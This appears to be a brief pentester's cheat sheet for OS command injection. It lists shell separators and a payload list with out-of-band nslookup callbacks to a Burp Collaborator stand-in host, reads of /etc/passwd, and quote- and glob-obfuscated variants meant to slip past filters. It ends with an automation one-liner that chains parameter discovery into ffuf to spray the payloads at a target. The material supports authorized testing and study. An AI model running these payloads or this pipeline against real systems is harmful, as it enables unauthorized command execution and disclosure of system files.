# Command Injection

### Command Seperators

```
& && | || 
https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
```

### Payload List

```
    |nslookup burpcollaborator|
    ||nslookup burpcollaborator||
    &nslookup burpcollaborator&
    &&nslookup burpcollaborator&&
    ;nslookup burpcollaborator; 
    whoami 
    wh'o'a'm'i
    wh"o"a"m"i
    cat /etc/passwd 
    cat</etc/passwd
    Filename Expansion 
    cat /e??/p????d
    cat</e??/p????d
```

### automation

```
python3 paramspider.py -d target -s TRUE -e ttf,eof,woff,svg | httpx -silent | gf rce | while read host;do ffuf -u $host -w payloads; done
```
